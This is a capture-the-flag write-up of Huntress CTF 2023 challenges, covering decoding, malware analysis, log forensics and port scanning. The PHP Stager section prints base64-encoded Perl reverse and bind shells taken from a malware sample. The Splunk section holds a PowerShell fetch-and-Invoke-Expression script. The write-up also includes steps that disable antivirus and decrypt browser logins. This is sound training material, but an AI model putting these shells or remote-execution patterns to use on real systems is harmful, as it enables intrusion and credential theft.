# Huntress CTF - 2023

Team Name: **D2CTF** | Username: **SlowMo7ion**

![Alt text](sources/ctf-banner.png)

---

## **WARMUPS Challenges**

### BaseFFFF+1 | 50 points | 10/4/2023

![Alt text](sources/baseFFFF-challenge.png)

> Maybe you already know about base64, but what if we took it up a notch?
>
> Download the files below. Attachments: [baseffff1](https://huntress.ctf.games/files/4f5b4be19374471dc575e58e9c09637b/baseffff1)

**Solution Walkthrough**

1. Examine the file contents:
    >鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸


2. With the unrecognizable text, let's think back on the challenge title and hint. The hexadecimal value: FFFF corresponds to 65535 in decimal. Adding one to that equals 65536. Is there such thing as base65536?

2. Turns out, there is. [Base65536 Decode Online Tool](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode)
    > base65536 encodes data in a similar fashion to base64, but its alphabet, instead of being 64 characters long, is 65536 characters long. This means, one can map 16 bits of data into a single unicode codepoint.
    >
    > Decoding is much more interesting*. I deviate a little from base64 in the part where I handle non-Base65536-codepoints. as Base65536 does not assign meaning to any single-byte codepoint, those can be placed anywhere inside the encoded string, either for formatting (whitespace, which can also be added automatically by the encoding function) or inserting cleartext messages. Even when having the abort-on-decoding-error enabled, base65536 will not stop when encountering an ASCII (7bit) character. This is meant as a feature.


3. Let's use this tool to decode the message and retrieve the flag

    ![Alt text](sources/baseFFFF-flag.png)

<font color="green"> **flag{716abce880f09b7cdc7938eddf273648}** </font>

---

#### CaeserMirror | 50 points | 10/5/2023

![Alt text](sources/CM-challenge.png)

> Caesar caesar, on the wall, who is the fairest of them all?
>
> Perhaps a clever ROT13?
>
> NOTE: this flag does not follow the usual MD5 hash standard flag format. It is still wrapped with the code>flag{} prefix and suffix.
>
> Download the file(s) below. Attachments: [caesarmirror.txt](https://huntress.ctf.games/files/869c3f4a516cfbfcc05934cd99de357e/caesarmirror.txt)

**Solution Walkthrough**

1. Download and open the file

    ![Alt text](sources/CM-text.png)


2. Using the hint, let's throw it into CyberChef. 
    * Take the First half of the text and use the ROT13 operation

    ![Alt text](sources/CM-rot1.png)

    * Then take the second half and use the ROT13 and Reverse operations

     ![Alt text](sources/CM-rot2.png)

3. With the message decoded and in the correct order, assemble both halves and grab each piece of the flag from the body of text.

    > Oh boy! Wow, this warmup challenge sure was a lot of fun to put together! I so 
    > definitely absolutely always love trying to think up new and innovative things
    > to do with the very basic, common and classic CTF techniques! The first part of  
    > your flag is `flag{julius_` and that is a great start but it is not everything  
    > that you will need to solve this challenge. I don't like trying to hide and 
    > separate each part of the flag. The second part of the flag is `in_a_` but you do 
    > need just a little bit more. What exactly should we include here to try and make
    > this filler text look more engaging and worthwhile? Should we add newlines? 
    > Should we add spaces and try and make it symmetrical? How many lines is enough 
    > to make this filler text look believable? A solid square of letters within a 
    > simple, monospace-font text file looks good enough to me. Are we almost at the 
    > end? It looks like it! I hope it is good. The third part of your flag is `reflection}` 
    > and at this point you should have everything that you need to submit this flag for 
    > points. The beginning is marked with the flag prefix and the opening curly brace 
    > and it includes English words separated by underscores, to end in a closing curly 
    > brace. Wow! Now THAT is a CTF! Who knew we could milk the caesar cipher to this 
    > extent?? Someone get that Julius Caesar guy a medal!

<font color="green"> **flag{julius_in_a_reflection}** </font>

---

### F12 | 50 points | 10/10/2023

![Alt text](sources/F12-challenge.png)

> Remember when Missouri got into hacking!?! You gotta be fast to catch this flag!
> 
> Press the Start button on the top-right to begin this challenge.
> 
> Connect with: http://chal.ctf.games:32522
>
> *Please allow up to 30 seconds for the challenge to become available.*

**Solution Walkthrough**

1. Navigate to the web page and click on the Capture The Flag button. A pop-up window opens, but immediately closes. Let's inspect the source to see if we can learn more about what happens when we click the button.

    ![Alt text](sources/F12-flag-page.png)

    * *A javascript function `ctf()` appears to open another window to a page called `capture_the_flag.html` when the Capture The Flag button is pushed.*

2. The `capture_the_flag.html` page is in the same directory as the page, so let's append it to our URL.

3. Now we see a button that says `Your flag is:`, but when we click on it nothing happens. Let's inspect the source again to see what it's supposed to do and reveal the flag.

    ![Alt text](sources/F12-flag.png)

    Video Walkthrough:

    https://github.com/jriz2/ctf-huntress23/assets/108373636/43157070-b4b9-4fd1-88fe-8ae25ae941c6

<font color="green"> **flag{03e8ba07d1584c17e69ac95c341a2569}** </font>

---

### Comprezz | 50 points | 10/4/2023

![Alt text](sources/Comprezz-challenge.png)

> Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?
>
> Download the file(s) below. Attachments: [comprezz](https://huntress.ctf.games/files/b3076f44a638721b1c585619108577df/comprezz)

**Solution Walkthrough**

1. Determine file type using `file`
    ```bash
    file comprezz
    ```

    ![Alt text](sources/Comprezz-file.png)

2. Since this is compress'd, let's use the `uncompress` command. To do that, we have to add the `.z` extension first.
    ```bash
    mv comprezz comprezz.z          #rename file with .z extension
    uncompress -f comprezz.z        #uncompress th data
    ```

3. Run the `file` command again on `comprezz`
    ```bash
    file comprezz
    ```

    ![Alt text](sources/Comprezz-file2.png)

3. `cat` comprezz to reveal the flag
    ```bash
    cat comprezz
    ```

    ![Alt text](sources/Comprezz-flag.png)

<font color="green"> **flag{196a71490b7b55c42bf443274f9ff42b}** </font>

---

### Baking | 50 points | 10/11/2023

![Alt text](sources/Baking-challenge.png)

> Do you know how to make cookies? How about HTTP flavored?
>
> Press the Start button in the top-right to begin this challenge.
> Connect with: http://chal.ctf.games:30484

**Solution Walkthrough**

1. Based on the challenge description, we can safely assume that we'll need to perform cookie manipulation. Interact with the site using a browser with developer options open and see what cookies are stored. They will be under the Application tab in the Storage section.

    ![Alt text](sources/Baking-site.png)
    
    * We can see that the Magic Cookies need to bake for 7200 minutes, Maybe we can speed this up

    ![Alt text](sources/Baking-cookie.png)

    * There is a cookie stored with a base64 encoded value

2. Let's decode in the value in CyberChef to see what data is being passed to the site. There is a timestamp we might be able to manipulate to trick the server into thinking that the 7200-minute bake time has already passed

    ![Alt text](sources/Baking-decoded-cookie.png)

3.  Using CyberChef, let's back-date the cookie value by 1 year, re-encode to base64, then get ready to send it to the server with BurpSuite.

    ![Alt text](sources/Baking-mycookie.png)

4. Using BurpSuite, we can modify the cookie using proxy interception before sending it to the server. Paste our updated base64 cookie value, then forward the request to the server to reveal the flag

    ![Alt text](sources/Baking-burp.png)

    ![Alt text](sources/Baking-flag.png)

    * BurpSuite Video Walkthrough:

        <video src="sources/Baking-video.mp4" controls title="Title"></video>
        https://github.com/jriz2/ctf-huntress23/assets/108373636/784ffa1d-4428-488d-86f9-04aa3fb6b2e4

<font color="green"> **flag{c36fb6ebdbc2c44e6198bf4154d94ed4}** </font>

---
---

## **MALWARE Challenges**

### Zerion | 50 points | 10/2/2023

![Alt text](sources/zerion-challenge.png)

> We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
>Download the file(s) below.
Attachments: [zerion](https://huntress.ctf.games/files/3140c2090a65b4a4810f9090ed72f6e1/zerion


**Solution Walkthrough**
1. Verify the file type with `file`

    ![Alt text](sources/zerion-file.png)

2. Since this looks like it is a php script, let's open the file in a text editor to view the syntax *(truncated output)*

    ![Alt text](sources/zerion-script.png)

3. It looks like script is chaining multiple encodings and patterns together, let's break down each step:

    1. The syntax appears to be reversed *(note the `strrev` function and base64 padding "==" at the beginning of the encoded string)*
    2. The characters are rotated with ROT13 *(`str_rot13`)*
    3. The syntax has been base64 encoded

4. Reverse the order of encoding using [CyberChef](https://gchq.github.io/CyberChef/) to reveal the full syntax and flag.

    ![Alt text](sources/zerion-decode.png)

<font color="green"> **flag{af10370d485952897d5183aa09e19883}** </font>

---

### HumanTwo | 50 points | 10/3/2023

![Alt text](sources/HumanTwo-challenge.png)

> During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the human2.aspx webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below. Attachments: [human2.aspx_iocs.zip](https://huntress.ctf.games/files/671ca0608e31fe1e67d84ed9e2c05a09/human2.aspx_iocs.zip

**Solution Walkthrough**

1. Unzip the file contents
    ```bash
    unzip human2.aspx_iocs.zip -d human2.aspx_iocs
    ```

    ![Alt text](sources/HumanTwo-unzip.png)

2. These filenames look like hashes, let's inspect the contents of a few to see if there are any obvious differences
    * Cycling through a few files in a text editor reveals a slight change on `line 36` for each file

    ![Alt text](sources/HumanTwo-files.gif)

3. Now that we have found a change from file to file, we can drill into that further. Let's use `grep` against a common string on line 36 to see if anything else stands out
    ```bash
    grep -r "String.Equals" .   #run from dir containing files
    ```
    
    ![Alt text](sources/HumanTwo-grep.png)

    * Nice! We found something different on the `cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19` file. Let's try to decode the values on this line

4. The strings seem to represent hexadecimal values (containing a-f 0-9 only). Let's use CyberChef with the `From Hex` recipe to decode the text and reveal the flag

    ![Alt text](sources/HumanTwo-decoded.png)


<font color="green"> **flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}** </font>

---

### Hot Off The Press | 50 points | 10/3/2023

![Alt text](sources/HOTP-challenge2.png)

> Oh wow, a malware analyst shared a sample that I read about in the news!
>
> But it looks like they put it in some weird kind of archive...? Anyway, the password should be **infected** as usual!
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> In Linux, download the file(s) below. Attachments: [hot_off_the_press](https://huntress.ctf.games/files/4b36d70af4871e3de9ee43f561c2472d/hot_off_the_press

**Solution Walkthrough**

1. Download the `hot_off_the_press` file and inspect what file type it is.
    ```bash
    file hot_off_the_press
    ```
    
    ![Alt text](sources/HOTP-file-type.png)

    * This is a UHarc archive file, so we can use some Windows tools to examine it further We'll move over to Windows for the rest of the challenge

2. In Wndows:
    1. Disable Virus & Threat Protection Settings to avoid issues while extracting the malware sample
    2. Download the `hot_off_the_press` file again and add the `.uha` file extension
    3. Download the [uharc06b](https://www.sac.sk/download/pack/uharc06b.zip) cmd utility and extract the contents of the archive.
    ```PowerShell
    .\uharc06b\UHARC.EXE e -pw .\hot_off_the_press.uha
    ```

    ![Alt text](sources/HOTP-extracted.png)

3. Open the `hot_off_the_press.ps1` file in a text editor to dissect the encoded text. We'll focus on decoding the `base64`, then handle the `gzip` compression.

    ![Alt text](sources/HOTP-raw.png)

3. Use CyberChef to create the following Recipe to handle the initial encoded string:
    * Remove all non base64 characters 
    * Replace the format string characters: {0} and {1} respectively
    * Convert From Base64
    * Gunzip

4. Use CyberChef again to create another Recipe and reveal the flag
    * Convert From Base64
    * From Hex

        ![Alt text](sources/HOTP-cyberchef-solve.gif)

<font color="green"> **flag{dbfe5f755a898ce5f2088b0892850bf7}** </font>

**Resources:**

* [Cooking Malicious PowerShell Obfuscated Commands with CyberChef](https://www.socinvestigation.com/cooking-malicious-powershell-obfuscated-commands-with-cyberchef/)
* [Base64 Patterns - Learning Aid](https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639)
* [CyberChef-Recipes](https://github.com/mattnotmax/cyberchef-recipes)

---

## PHP Stager | 50 points | 10/6/2023

![Alt text](sources/PHP-challenge.png)

> Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?
> 
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below. Attachments: [phonetic](https://huntress.ctf.games/files/88b1bf37a712f029d19a7f2a2e3bf9ab/phonetic)

**Solution Walkthrough**

1. Open the `phoentic` file in a text editor to examine the code.

    ![Alt text](sources/PHP-code.png)

    * The `deGRi` function has several components which appear to be a layer of obfuscation. We may be able to use it to decode the payload later.
    * The variable assignments have been randomized using a for-each loop against randomized characters to mask their real contents, let's use an interactive php session to decipher them.
        ```bash
        php -a
        ```

    * Run each section of the code separately to reveal variables:

        ![Alt text](sources/PHP-variables.png)

        * Variable Contents:
            * `$gbaylYLd6204` = the long base64 encoded payload
            * `$fsPwhnfn8423` = the `base64_decode` function
            * `$oZjuNUpA325` = the `strrev` function
            * `$k` = the `create_function` function
                * *note: `create_function` is no longer used in php and won't be included in this solution*
        
2. Now that we know the variables, copy and paste the entire `deGRi` function and `$gbaylYLd6204` variable contents into the interactive session.

3. Use the discovered functions to piece together a command that will leverage the `deGRi` function reveal the base64 encoded the payload stored in `$gbaylYLd6204`.
    ```php
    echo base64_decode(deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302"));
    ```

    ![Alt text](sources/PHP-internal.png)

    * Within the payload, there is an interesting function: `actionNetwork()` with more base64 encoded variables.

4. Using `python` or an online tool like [CyberChef](https://gchq.github.io/CyberChef/), decode the internal variables.
    ```python
    import codecs

    #assign base64 encoded values as bytes using variables
    back_connect = b"IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ=="
    bind_port = b"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0="

    #decode the base64
    bc_out = codecs.decode(back_connect, 'base64')
    bp_out = codecs.decode(bind_port, 'base64')

    #print both outputs as a string
    print(bc_out.decode(),bp_out.decode())
    ```

    ![Alt text](sources/PHP-decoded.png)

5. The syntax after the uuencode.uu line looks strange. Decode it using an online [UUEncode Decoder](https://www.dcode.fr/uu-encoding) to reveal the flag.

    ![Alt text](sources/PHP-flag.png)

<font color="green"> **flag{9b5c4313d12958354be6284fcd63dd26}** </font>

---
---

## **FORENSICS Challenges**

### Traffic | 50 points | 10/4/2023

![Alt text](sources/traffic-challenge.png)

>We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?
>
>Some tools like rita or zeek might help dig through all of this data!
>
>Download the file below. Attachments: [trafic.7z](https://huntress.ctf.games/files/efd8115eedbda53848676208e38e6afc/traffic.7z)

**Solution Walkthrough**

1. Download and unzip the log files into a directory
    ```bash
    wget https://huntress.ctf.games/files/efd8115eedbda53848676208e38e6afc/traffic.7z
    7z x traffic.7z
    mv 2021-09-08 traffic
    ```

2. List out the contents we just unzipped. Following the hints, let's start with the DNS logs to search for a "sketchy site"

    ![Alt text](sources/traffic-unzipped.png)

3. Using zcat to parse the gzipped files, let's look at fields first to better understand column positions within the log, then the first 10 entries in the DNS logs to see how they are structured. We can see from here that dns queries are listed in the 10th field.

    ```bash
    zcat dns.*.log.gz | grep "^#fields" | head -1   #view the fields
    zcat dns.*.log.gz | cut -f 3,5 -d ' ' | sort -u | head -10 #first 10 log entries 
    ```

    ![Alt text](sources/traffic-dnsllog.png)

4. Let's focus on the 10th position to isolate DNS hostnames and see if anything jumps out.

    ```bash
    zcat dns.*.log.gz | cut -f 3,5 -d ' ' | awk '{print $10}' | sort | uniq -c | sort -nr
    ```

    ![Alt text](sources/traffic-dns-sorted.png)

5. At first glance, nothing jumps out. Let's grep for "sketch" based on our hint above.

    ```bash
    zcat dns.*.log.gz | cut -f 3,5 -d ' ' | sort -u | awk '{print $10}' | grep sketch
    ```

    ![Alt text](sources/traffic-sketchysite.png)

    * Nice! We found 6 instances to `sketchysite.github.io` let's check it out

6. Visit `sketchysite.github.io` for the flag

    ![Alt text](sources/traffic-flag.png)

<font color="green"> **flag{8626fe7dcd8d412a80d0b3f0e36afd4a}** </font>

---

### Wimble | 50 points | 10/10/2023

![Alt text](sources/Wimble-challenge.png)

> *"Gretchen, stop trying to make fetch happen! It's not going to happen!"* - Regina George, Mean Girls
> 
> Download the files below. Attachments: [wimble.7z](https://huntress.ctf.games/files/38581e3c484b13f189a427f6f168b07c/wimble.7z)

**Solution Walkthrough**

1. After downloading, list and extract the contents of `wimble.7z` to see what we'll be working with
    ```bash
    7z l wimble.7z      #list contents
    7z x wimble.7z      #extract contents to current directory
    ```

    ![Alt text](sources/Wimble-unzip.png)

2. Determine the file type of the newly extracted file `fetch`
    ```bash
    file fetch
    ```

    ![Alt text](sources/Wimble-fetch.png)

    * We can see that `fetch` is still compressed. List the contents
    ```bash
    7z l fetch
    ```

    ![Alt text](sources/Wimble-pf.png)

    * The contents comtain prefetch files indicated by the `.pf` extension. Let's jump over to Windows to analyze them further.

3. In Windows, download and install [Eric Zimmerman's Forensic Tools](https://ericzimmerman.github.io/#!index.md) and the .net6 framework *(if needed)* to examine the prefetch data

    * Set up a Directory to install the EZ tools into, then run the `Get-ZimmermanTools.ps1` script

        ![Alt text](sources/Wimble-eztools.png)

4. Set up a working directory in Windows and get the prefetch files ready for analysis. We'll use a directory named `fetch` for this example:
    1. Download `wimble.7z` again
    2. Extract the `fetch` archive again and add the `.wim` extension to the file, it now should look like: **`fetch.wim`**
    3. Lastly, extract all of the contents from `fetch.wim` to the `fetch` directory

5. Run PECmd.exe against the working directory and use `findstr -i` to search for a flag string and reveal the flag.

    ![Alt text](sources/Wimble-flag.png)

<font color="green"> **FLAG{97F33C9783C21DF85D79D613B0B258BD}** </font>

---

### Dumpster Fire | 50 points | 10/10/2023

![Alt text](sources/DF-challenge.png)

> We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!
>
> Download the file(s) below. Attachments: [dumpster_fire.tar.xz](https://huntress.ctf.games/files/d2b3f8dfd0c1b434f91b918080206d7e/dumpster_fire.tar.xz)

**Solution Walkthrough**

1. Extract the contents of the `dumpster_fire.tar.xz` file and set up a working directory.
    ```bash
    mkdir Dumpster-Fire                 #create working dir
    cd Dumpster-Fire                    #move into working dir
    xz -d -v dumpster_fire.tar.xz       #unzip
    tar -xvf dumpster_fire.tar          #extract
    rm dumpster_fire.tar                #clean up compressed file
    ls -lisa                            #list extracted contents
    ```

    ![Alt text](sources/DF-image.png)

    * It looks like we're working with a root directory of a Linux system.

2. Based on the hints in the description, navigate through the /home directory for clues.
    ```bash
    cd home
    cd challenge
    cd .mozilla
    cd firefox
    cd bc1m1zlr.default-release
    ```

3. Now that we are are exploring the Firefox data within the user's profile, let's check out `logins.json` where credentials can be stored within the browser.
    ```bash
    cat logins.json
    ```

    ![Alt text](sources/DF-logins.png)

    * We have an encrypted username and password to work with

4. Use [firefox_decrypt](https://github.com/unode/firefox_decrypt), to break the username and password to get the flag

    ![Alt text](sources/DF-flag.png)

<font color="green"> **flag{35446041dc161cf5c9c325a3d28af3e3}** </font>

---

### Backdoored Splunk | 50 points | 10/8/2023

![Alt text](sources/Splunk-challenge.png)

> You've probably seen Splunk being used for good, but have you seen it used for evil?
> 
> NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.
> 
> Download the file(s) below and press the Start button on the top-right to begin this challenge.
>
> Connect with: http://chal.ctf.games:30199
>
>Attachments: [Splunk_TA_windows.zip](https://huntress.ctf.games/files/301e268b45f291b0b5c96f91d2f2fc87/Splunk_TA_windows.zip)

**Solution Walkthrough**

1. Check out the site, we get a clue in the error message that we need a proper header to proceed.

    ![Alt text](sources/Splunk-header.png)

2. Exctract the file contents, then browse through the `Splunk_TA_windows` directory. After some digging, I came across a web request in the `nt6-health.ps1` script. There was some base64 encoded text in the Authorization Header within the file. I plugged this into CyberChef for another clue

    ![Alt text](sources/Splunk-backdoor.png)

3. We now know this is the payload we need to use. Modify the code in `nt6-health.ps1` to craft a PowerShell script that isolates the http response from the web server containing the flag.

    ```PowerShell
    $PORT = '30199'     #Dynamic to the running service of the `Start` button
    $OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
    
    if ($html -match '<!--(.*?)-->') {
        $value = $matches[1]
        $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
        Invoke-Expression $command
    })

    Write-Host ($OS)
    ```

    ![Alt text](sources/Splunk-flag.png)
    
    * *This flag was not returned with the curly braces. Add them before submission.*

<font color="green"> **flag{60bb3bfaf703e0fa36730ab70e115bd7}** </font>

---

### VeeBeeEee | 50 points | 10/11/2023

![Alt text](sources/VB-challenge.png)

> While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
> 
> **NOTE**: this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
> 
> Download the file(s) below. ttachments: [veebeeeee](https://huntress.ctf.games/files/cc8958c3e52c676db02299c8f96536db/veebeeeee)

**Solution Walkthrough**

1. Do initial recognition using the `file` command to determine file type (if there is one). This one is just raw data
    ```bash
    file veebeeeee
    ```

    ![Alt text](sources/VB-file.png)

2. Open in a text editor to view the data. 

    ![Alt text](sources/VB-raw.png)

3. The data is not human-readable, so let's try CyberChef and start with the Magic operation

    ![Alt text](sources/VB-magic.png)

4. CyberChef found a Recipe to decode the text. Use `Microsoft_Script_Decoder()` to make the ouput more readable.

    ![Alt text](sources/VB-chefout.png)

5. We need to clean this up further by removing all of the instances of: `''''''''''''''''al37ysoeopm'al37ysoeopm`

6. Now we can begin identifying how the PowerShell commands are obfuscated within the script:
    1. The strings contianing the code have been separated into multiple variables, then concatenated together

        ![Alt text](sources/VB-strings.png)

    2. Ampersands `&` are removed later in the script to finish cleaning up the syntax, so let's clean up the rest of it and assemble everything

        ![Alt text](sources/VB-replace.png)

7. We have finished cleaning up the syntax. With the code cleaned up, we can see that a request is being made to pull a file from a Pastebin link; a common staging place for malware.

    ![Alt text](sources/VB-clean.png)

8. Since this is a CTF and not real malware, let's visit the link to reveal the flag: https://pastebin.com/raw/SiYGwwcz

    ![Alt text](sources/VB-flag.png)

<font color="green"> **flag{ed81d24958127a2adccfb343012cebff}** </font>

---
---

## **OSINT Challenges**

### Where am I? | 50 points | 10/10/2023

![Alt text](sources/WamI-challenge.png)

> Your friend thought using a JPG was a great way to remember how to login to their private server. Can you find the flag?
> 
> Download the file(s) below. Attachments: [PXL_20230922_231845140_2.jpg](https://huntress.ctf.games/files/c0d504cd54b9e52ba752bb7a32503a89/PXL_20230922_231845140_2.jpg)

**Solution Walkthrough**

1. Verify the file type using the `file` command
    ```bash
    file PXL_20230922_231845140_2.jpg
    ```

    ![Alt text](sources/WamI-file.png)

    * The description seems off, it looks like encoded text, let's explore this further.

2. Decode the description to reveal the flag

    ![Alt text](sources/WamI-flag.png)

<font color="green"> **flag{b11a3f0ef4bc170ba9409c077355bba2)** </font>

---
---

## **MISCELLANEOUS Challenges**

### I Wont Let You Down | 50 points | 10/5/2023

![Alt text](sources/IWLYD-challenge.png)

> OK Go take a look at this IP:
>
> Connect here: http://155.138.162.158 # USING ANY OTHER TOOL OTHER THAN NMAP WILL DISQUALIFY YOU. DON'T USE BURPSUITE, DON'T USE DIRBUSTER.

**Solution Walkthrough**

1. Let's check out the url in a browser. Yep, it's a Rick-roll! But, we also got a hint to try `nmap`

    ![Alt text](sources/IWLYD-url.png)



1. Port scan the ip using `nmap`
    ```bash
    nmap -Pn -sT 155.138.162.158 -p- -sV 
    ```

    ![Alt text](sources/IWLYD-scan.png)
    
2. Our scan revealed some services running on non-standard and high port numbers. Since these aren't commonly used, let's do a banner grab with `netcat` to get the flag.
    ```bash
    nc 155.138.162.158 8888
    ```
    
    ![Alt text](sources/IWLYD-flag.png)

    * It's also a Rick-roll, but we still got the flag!

<font color="green"> **flag{93671c2c38ee872508770361ace37b02}** </font>

---

* Still need to add writeups for:
    * Chicken Wings (wingdings)
    * Layered Security (GIMP)
